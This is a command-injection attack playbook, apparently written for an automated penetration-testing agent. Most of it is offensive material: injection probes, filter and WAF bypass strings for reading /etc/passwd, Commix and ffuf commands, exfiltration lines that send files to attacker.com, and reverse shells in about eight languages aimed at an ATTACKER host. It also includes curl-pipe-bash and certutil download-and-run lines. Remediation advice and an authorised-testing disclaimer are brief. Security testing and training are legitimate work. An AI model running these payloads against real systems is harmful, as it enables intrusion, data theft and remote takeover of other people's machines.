# Command Injection — Skill Playbook

**Mitre ATT&CK ID:** T1059 (Command and Scripting Interpreter), T1190 (Exploit Public-Facing Application)
**OWASP Mapping:** A03:2021 – Injection
**Severity:** Critical
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: command-injection-v2
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1059
owasp_mapping:
  - A03:2021-Injection
tags:
  - command-injection
  - os-command
  - rce
  - web-application
  - T1059
  - T1190
  - T1203
environments:
  - web
  - api
  - network-devices
  - iot
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Entry Point Enumeration

Identify input vectors that may pass into OS command execution:

| Functionality | Parameters | Examples |
|---|---|---|
| Ping/traceroute tools | `host`, `ip`, `target` | `ping -c 4 <host>` |
| DNS lookup tools | `host`, `domain` | `nslookup <domain>` |
| File processing | `file`, `path`, `dir` | `convert <file>` |
| Network tools | `url`, `host` | `curl <url>` |
| System utilities | `command`, `exec` | `whois <domain>` |
| FTP/HTTP download | `url`, `download` | `wget <url>` |
| Email functions | `to`, `subject` | `sendmail <to>` |
| Backup/restore | `path`, `db` | `mysqldump <db>` |

### 1.2 Injection Characters (PayloadsAllTheThings + Commix)

**Command separators:**
```
;  (semicolon - Linux/Windows)
|  (pipe)
|| (OR)
&& (AND)
&  (background)
`
%0a (newline)
\n
%3B (URL-encoded ;)
```

**Command substitution:**
```
`command`
$(command)
$((command)) (arithmetic)
$(<file)
```

**Redirectors:**
```
> (overwrite)
>> (append)
2> (stderr)
2>&1 (merge stderr into stdout)
< (input redirect)
```

### 1.3 Probe Payloads (PayloadsAllTheThings)

**Basic detection:**
```
; id
| id
|| id
&& id
& id
`id`
$(id)
;whoami
|whoami
||whoami
&&whoami
```

**Linux-specific probes:**
```
; ls -la
| cat /etc/passwd
; echo test > /tmp/test
`uname -a`
$(uname -a)
; sleep 5
| sleep 5
; ping -c 10 127.0.0.1
```

**Windows-specific probes:**
```
; dir
| type C:\Windows\win.ini
&& whoami
|| ver
; ping -n 10 127.0.0.1
& timeout /t 5
```

### 1.4 Detection Analysis

| Indicator | Finding |
|---|---|
| `id` output reflected | Command execution confirmed |
| 5-second delay | Time-based command execution |
| Out-of-band DNS callback | Blind command execution |
| File created | Command execution confirmed |
| Error message with command output | Command execution confirmed |

### 1.5 Automated Detection

**Commix (Comprehensive Command Injection):**
```bash
# Basic scan
commix -u "https://target.com/ping?host=127.0.0.1" --batch

# With cookie/auth
commix -u "https://target.com/ping?host=127.0.0.1" --cookie="session=abc123" --batch

# POST data
commix -u "https://target.com/ping" --data="host=127.0.0.1&submit=1" --batch

# Aggressive level
commix -u "https://target.com/ping?host=127.0.0.1" --level=3 --batch

# Proxy through Burp
commix -u "https://target.com/ping?host=127.0.0.1" --proxy="http://127.0.0.1:8080" --batch

# Technique selection (classic/echo-based/time-based)
commix -u "https://target.com/ping?host=127.0.0.1" --technique=classic --batch

# Injection point in JSON body
commix -u "https://target.com/api" --data='{"host":"127.0.0.1"}' --json --batch
```

**PayloadsAllTheThings command injection fuzzer:**
```bash
# Use with ffuf
ffuf -u "https://target.com/ping?host=FUZZ" -w command_injection_payloads.txt -fw 1

# Use with Burp Intruder
# Payload position: host=§;id§
# Grep match: uid=, gid=, /bin/, id=
```

---

## 2. Confirmation

### 2.1 Command Execution Confirmation

**Linux (echo-based - recommended by Commix):**
```
; echo '<COMMIX_MARKER>'   →  <COMMIX_MARKER> reflected
| echo INJECTED
$(echo INJECTED)
`echo INJECTED`
```

**Time-based:**
```
; sleep 5
| ping -c 5 127.0.0.1
& timeout /t 5 (Windows)
```

**Out-of-band:**
```
; nslookup unique-id.attacker.com
| curl http://attacker.com/?id=$(id)
& ping unique-id.attacker.com
```

### 2.2 Blind Command Injection Detection

Use Interactsh / Burp Collaborator:
```bash
; curl http://<unique>.interactsh.example.com/$(whoami)
| nslookup $(hostname).<unique>.interactsh.example.com
& curl http://<unique>.interactsh.example.com/?user=%username%
```

---

## 3. Exploitation

### 3.1 Data Exfiltration

**File read:**
```
; cat /etc/passwd
| type C:\Windows\win.ini
; cat /app/config.yaml
; cat /proc/self/environ
; find / -name "*.db" 2>/dev/null
```

**Exfiltrate file via HTTP:**
```
; curl http://attacker.com/$(cat /etc/passwd | base64 | tr -d '\n')
| nc -e /bin/bash attacker.com 4444
; bash -c 'exec 5<>/dev/tcp/attacker.com/4444;cat <&5|while read line;do $line 2>&5>&5;done'
```

### 3.2 Reverse Shell

**Bash reverse shell:**
```
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/bash ATTACKER 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
; 0<&196;exec 196<>/dev/tcp/ATTACKER/4444; sh <&196 >&196 2>&196
```

**Python reverse shell:**
```
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Perl reverse shell:**
```
; perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Windows (PowerShell):**
```
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 3.3 WAF Bypass (HackTricks)

**Filter evasion:**
```
# Encoded
;%63at%20/etc/passwd
;$(cat${IFS}/etc/passwd)
;c""at${IFS}/etc/passwd
;c'a't${IFS}/etc/passwd
;c\at${IFS}/etc/passwd
;{cat,/etc/passwd}
;echo$IFS$(cat$IFS/etc/passwd)

# URL encoding
%3Bid
%0aid
%2523id (double encoding)

# Without spaces
;cat${IFS}/etc/passwd
;cat${IFS%??}/etc/passwd
;${IFS}cat${IFS}/etc/passwd
;cat$IFS$9/etc/passwd

# Hex encoding
;echo$IFS$'cat\x20/etc/passwd'

# Variable expansion
;$e=1;cat$IFS/etc/passwd$e

# Wildcards
;c*$IFS/e*/*ss*d

# Case manipulation
;CaT${IFS}/eTc/pAsSwD
```

**Blacklist bypass:**
```
# Bypass 'cat'
;head /etc/passwd
;tail /etc/passwd
;tac /etc/passwd
;more /etc/passwd
;less /etc/passwd
;nl /etc/passwd
;sed -n '1,100p' /etc/passwd
;awk '{print}' /etc/passwd

# Bypass 'bash', 'sh'
;python3 -c 'print(open("/etc/passwd").read())'
;perl -e 'print <>'

# Bypass keyword filters
;c${x}at /etc/passwd
;c${x}a${x}t /etc/passwd
;c'a't /etc/passwd
;c"a"t /etc/passwd
;c\at /etc/passwd
;`c\at` /etc/passwd
```

---

## 4. Tool-Specific Guidance

### 4.1 Commix (Full Workflow)

```bash
# Install
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --version

# Basic usage
python3 commix.py -u "https://target.com/ping?host=127.0.0.1" --batch

# Advanced usage
python3 commix.py -u "https://target.com/ping?host=127.0.0.1" \
  --level=3 \
  --risk=3 \
  --cookie="session=abc123" \
  --proxy="http://127.0.0.1:8080" \
  --user-agent="Mozilla/5.0" \
  --batch

# Shell access
python3 commix.py -u "https://target.com/ping?host=127.0.0.1" --os-shell
python3 commix.py -u "https://target.com/ping?host=127.0.0.1" --os-pwn

# HTTP request from file (Burp exported)
python3 commix.py -r request.txt --batch

# JSON body
python3 commix.py -u "https://target.com/api" --data='{"host":"127.0.0.1"}' --json --batch

# HTTP headers injection
python3 commix.py -u "https://target.com" --headers="X-Forwarded-For: 127.0.0.1" --batch

# WAF evasion
python3 commix.py -u "https://target.com/ping?host=127.0.0.1" --tamper=space2comment --batch
python3 commix.py -u "https://target.com/ping?host=127.0.0.1" --skip-tampering --batch
```

### 4.2 Manual (Burp Suite)

1. Intercept request with command injection vector
2. Send to Repeater
3. Test with basic probes: `;id`, `|id`, `&&id`, `\`id\``
4. Confirm with echo-based: `;echo COMMIX_TEST`
5. Time-based: `;sleep 5`
6. OOB: `;nslookup unique.attacker.com`
7. Escalate to reverse shell

### 4.3 PayloadAllTheThings Command Injection (Direct References)

```bash
# Copy payloads
cp -r /path/to/PayloadsAllTheThings/Command\ Injection/* .

# Key files
Command Injection/README.md
Command Injection/Intruder-payloads/*.txt
```

---

## 5. PoC Generation

### PoC Template

```markdown
## Command Injection — [FINDING_ID]

**URL:** https://target.com/ping
**Parameter:** host
**Type:** Reflected / Blind / Time-based
**OS:** Linux / Windows / Container
**Injection char:** ; | && || & ` $()

### Payload
```
; id
```

### Evidence
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Impact
- Command execution: YES
- Reverse shell: YES/NO
- File read: /etc/passwd, /app/config.yaml
- Privilege escalation: YES/NO (www-data → root)

### Remediation
- Never pass user input to OS commands
- Use native language libraries (e.g., socket.ping instead of system ping)
- Allow-list commands and validate inputs
- Run commands with least privilege
- Containerize / isolate execution

### Reproduction Steps
1. Send GET `https://target.com/ping?host=127.0.0.1;id`
2. Observe `uid=33(www-data)` in response
3. Verify with `;cat /etc/passwd`
4. Escalate with reverse shell: `;bash -i >& /dev/tcp/ATTACKER/4444 0>&1`
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Reproduction in isolated container
- [ ] Both Linux and Windows payloads tested
- [ ] OOB callback verified
- [ ] Impact scope documented (read-only vs RCE)
- [ ] No destructive commands executed
- [ ] No data modified

### Prohibited Actions
- `rm -rf`, `dd`, `mkfs`
- Dropping files on production
- Reversing shells on production without approval
- Modifying system state

---

## 7. Command Injection Cheat Sheet (PayloadsAllTheThings + HackTricks)

### Linux Commands
```
id, whoami, uname -a, cat /etc/passwd, ls -la, find / -perm -4000, 
nc -lvnp 4444, bash -i >& /dev/tcp/ATTACKER/4444 0>&1, 
curl http://attacker.com/shell.sh | bash, 
wget http://attacker.com/shell.sh && bash shell.sh, 
python3 -c '...', perl -e '...', php -r '...', 
crontab -l, ss -tlnp, netstat -tlnp, 
env, set, history, ifconfig, ip addr, 
sudo -l, cat /etc/shadow, 
mount, df -h, ps aux
```

### Windows Commands
```
whoami, whoami /all, ver, ipconfig /all, 
net user, net localgroup, net group /domain, 
dir C:\, type C:\Windows\win.ini, 
systeminfo, tasklist, sc query, 
netstat -ano, route print, 
powershell -nop -c "...", 
wmic process list, wmic qfe list, 
whoami /priv, net share, 
reg query HKLM\SAM, reg query HKCU\...,
certutil -urlcache -f http://attacker.com/shell.exe shell.exe
```

### Linux Reverse Shell One-liners
```
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Netcat
nc -e /bin/sh ATTACKER 4444

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Socat
socat TCP:ATTACKER:4444 EXEC:/bin/sh

# Telnet
telnet ATTACKER 4444 | /bin/sh
```

### Windows Reverse Shell One-liners
```
# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Netcat
nc -e cmd.exe ATTACKER 4444

# Certutil (download)
certutil -urlcache -f http://ATTACKER/shell.exe shell.exe
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1059 | Command and Scripting Interpreter | Primary |
| T1059.001 | PowerShell | Windows exploitation |
| T1059.004 | Unix Shell | Linux exploitation |
| T1190 | Exploit Public-Facing Application | Initial access |
| T1203 | Exploitation for Client Execution | Payload delivery |
| T1574.001 | DLL Search Order Hijacking | Persistence |
| T1505.003 | Web Shell | Persistence |
| T1105 | Ingress Tool Transfer | Download payloads |
| T1106 | Native API | Command execution via APIs |

---

## 9. References

- Commix: https://github.com/commixproject/commix
- PayloadsAllTheThings Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- HackTricks Command Injection: https://book.hacktricks.xyz/pentesting-web/command-injection
- Reverse Shell Cheat Sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- GTFOBins: https://gtfobins.github.io/
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*